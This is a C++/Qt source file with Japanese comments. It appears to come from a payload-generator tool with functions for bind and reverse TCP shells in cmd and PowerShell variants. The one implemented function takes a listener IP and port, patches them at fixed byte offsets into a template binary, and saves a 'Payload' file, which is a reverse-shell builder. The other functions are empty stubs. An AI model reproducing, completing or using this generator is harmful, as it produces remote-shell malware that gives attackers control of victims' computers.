#include "mainwindow.h"



void MainWindow::GenerateBindTcp_Cmd() {

}

void MainWindow::GenerateReverseTcp_Cmd() {
    // 入力ダイアログを表示
    InputDialog dialog("ReverseTcp_Cmd", "127.0.0.1", "4444", this);

    if (dialog.exec() == QDialog::Accepted) {
        // 入力されたIPアドレスとポートを取得
        QString ipAddress = dialog.getIpAddress();
        QString port = dialog.getPort();

        // 対象のファイルパス
        QString filePath = "";

        // IPアドレスとポートをワイド文字列に変換
        std::wstring ipAddressW = ipAddress.toStdWString();
        std::wstring portW = port.toStdWString();

        // バッファサイズを確保 (最大255文字に拡張)
        ipAddressW.resize(255, L'\0');
        portW.resize(255, L'\0');

        // ファイルを開く
        QFile file(filePath);
        if (!file.open(QIODevice::ReadOnly)) {
            QMessageBox::critical(this, "エラー", "ファイルのオープンに失敗しました。");
            return;
        }

        // ファイルデータを読み込み
        QByteArray fileData = file.readAll();
        file.close();

        DWORD ipOffset = 0x2680;
        DWORD portOffset = 0x1fe;

        // IPアドレスを書き込み
        memcpy(fileData.data() + ipOffset, ipAddressW.c_str(), (ipAddressW.size() + 1) * sizeof(wchar_t));

        // ポートを書き込み
        memcpy(fileData.data() + (ipOffset + portOffset), portW.c_str(), (portW.size() + 1) * sizeof(wchar_t));

        QString defaultPath = "Generated\\Payload";
        SaveToFile(fileData, this, defaultPath);
    }
}



void MainWindow::GenerateBindTcp_Powershell() {

}


void MainWindow::GenerateReverseTcp_Powershell() {

}

void MainWindow::GenerateReverseTcp_Vendetta() {

}
